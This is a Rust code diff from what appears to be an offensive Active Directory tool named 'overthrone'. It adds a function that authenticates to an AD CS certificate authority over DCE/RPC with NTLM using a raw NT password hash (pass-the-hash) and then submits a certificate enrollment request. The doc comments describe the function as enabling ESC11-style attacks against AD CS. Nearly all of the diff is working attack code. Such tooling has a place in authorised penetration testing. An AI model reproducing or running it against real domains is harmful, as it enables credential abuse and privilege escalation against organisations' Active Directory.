@@ -11,12 +11,26 @@
 
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::epm::{
-    btf_read_frame, btf_write_frame, build_rpc_bind, build_rpc_request, ndr_conformant_string,
+    btf_read_frame, btf_write_frame, build_auth3_pdu, build_rpc_bind, build_rpc_bind_auth,
+    build_rpc_request, build_rpc_request_auth, extract_auth_body, ndr_conformant_string,
     resolve_uuid_via_epm_tcp,
 };
 use overthrone_core::proto::smb::SmbSession;
+use overthrone_core::proto::smb2::{
+    build_ntlmssp_authenticate_hash, build_ntlmssp_negotiate, parse_ntlmssp_challenge,
+};
 use tokio::net::TcpStream;
 use tracing::{debug, info};
+
+/// NTLM credentials for authenticated RPC.
+pub struct NtlmCredential<'a> {
+    /// NetBIOS domain name
+    pub domain: &'a str,
+    /// Username (without domain prefix)
+    pub username: &'a str,
+    /// NT password hash (32 raw bytes, already decoded from hex)
+    pub nt_hash: &'a [u8],
+}
 
 /// ICertRequestD interface UUID (little-endian byte order)
 /// UUID: d99e6e74-fc88-11d0-b498-00a0c90312f3
@@ -259,6 +273,129 @@ pub async fn request_cert_via_tcp_rpc(
     stub.extend_from_slice(&0u32.to_le_bytes());
 
     let req = build_rpc_request(OPNUM_REQUEST_CERTIFICATE, &stub);
+    btf_write_frame(&mut stream, &req).await?;
+    let resp = btf_read_frame(&mut stream).await?;
+
+    parse_icertrequest_response(&resp, ca_name)
+}
+
+/// Request a certificate via TCP RPC with NTLM authentication.
+///
+/// Performs the NTLM authentication handshake over DCE/RPC (bind with NTLMSSP
+/// Type 1, receive Type 2 challenge, send AUTH3 with Type 3), then issues the
+/// certificate enrollment request on the authenticated RPC channel.
+///
+/// This enables ESC11-style attacks against AD CS with NTLM authentication
+/// (as opposed to anonymous/unauth only).
+///
+/// # Arguments
+/// * `ca_host` - CA server hostname or IP
+/// * `ca_name` - CA common name, e.g. "domain-CA"
+/// * `template` - Certificate template name, e.g. "User"
+/// * `subject` - Subject for the certificate, e.g. "CN=attacker"
+/// * `csr_der` - PKCS#10 DER-encoded Certificate Signing Request
+/// * `cred` - NTLM credentials (domain, username, NT hash)
+///
+/// # Returns
+/// Raw DER-encoded X.509 certificate bytes
+pub async fn request_cert_via_tcp_rpc_auth(
+    ca_host: &str,
+    ca_name: &str,
+    _template: &str,
+    _subject: &str,
+    csr_der: &[u8],
+    cred: &NtlmCredential<'_>,
+) -> Result<Vec<u8>> {
+    info!(
+        "[ICertRequestD/TCP+NTLM] Requesting cert via authenticated TCP RPC: CA={}, host={}",
+        ca_name, ca_host
+    );
+
+    let (_resolved_host, port) = resolve_uuid_via_epm_tcp(ca_host, &ICERTREQUEST_D_UUID).await?;
+
+    let addr = format!("{}:{}", ca_host, port);
+    debug!("[ICertRequestD/TCP+NTLM] Connecting to {addr}");
+
+    let mut stream = TcpStream::connect(&addr)
+        .await
+        .map_err(|e| OverthroneError::Rpc {
+            target: addr.clone(),
+            reason: format!("TCP connect failed: {e}"),
+        })?;
+
+    // ── Step 1: Bind with NTLMSSP Type 1 (Negotiate) ──
+    let ntlmssp_type1 = build_ntlmssp_negotiate();
+    let bind_req = build_rpc_bind_auth(
+        &ICERTREQUEST_D_UUID,
+        0,
+        0,
+        Some(&ntlmssp_type1),
+        2, // RPC_C_AUTHN_LEVEL_CONNECT
+    );
+    btf_write_frame(&mut stream, &bind_req).await?;
+
+    let bind_resp = btf_read_frame(&mut stream).await?;
+    if !overthrone_core::proto::epm::is_bind_accepted(&bind_resp) {
+        return Err(OverthroneError::Rpc {
+            target: addr,
+            reason: "ICertRequestD TCP bind rejected (with NTLM auth)".to_string(),
+        });
+    }
+
+    // ── Step 2: Extract NTLMSSP Type 2 (Challenge) from bind_ack auth verifier ──
+    let challenge_bytes = extract_auth_body(&bind_resp).ok_or_else(|| OverthroneError::Ntlm(
+        "Bind_ack missing NTLMSSP challenge in auth verifier".to_string()
+    ))?;
+
+    let challenge = parse_ntlmssp_challenge(challenge_bytes)?;
+
+    // ── Step 3: Build NTLMSSP Type 3 (Authenticate) ──
+    let (type3, _session_key) = build_ntlmssp_authenticate_hash(
+        cred.domain,
+        cred.username,
+        cred.nt_hash,
+        &challenge,
+    )?;
+
+    // ── Step 4: Send AUTH3 PDU with Type 3 ──
+    let auth3 = build_auth3_pdu(&type3, 2);
+    btf_write_frame(&mut stream, &auth3).await?;
+
+    // No response expected for AUTH3 (RFC accepted silently).
+
+    // ── Step 5: Build and send the certificate enrollment request ──
+    let mut stub = Vec::new();
+    stub.extend_from_slice(&[0u8; 20]);
+    stub.extend_from_slice(&ndr_conformant_string(ca_name));
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    let count = csr_der.len() as u32;
+    stub.extend_from_slice(&count.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    while stub.len() % 8 != 0 {
+        stub.push(0);
+    }
+    stub.extend_from_slice(&count.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&count.to_le_bytes());
+    stub.extend_from_slice(csr_der);
+    stub.extend_from_slice(&ndr_conformant_string(""));
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+    stub.extend_from_slice(&0x00020004u32.to_le_bytes());
+    stub.extend_from_slice(&0u32.to_le_bytes());
+
+    let req = build_rpc_request_auth(
+        OPNUM_REQUEST_CERTIFICATE,
+        &stub,
+        None, // CONNECT level auth — no verifier needed on request PDU
+        0,
+    );
     btf_write_frame(&mut stream, &req).await?;
     let resp = btf_read_frame(&mut stream).await?;
 
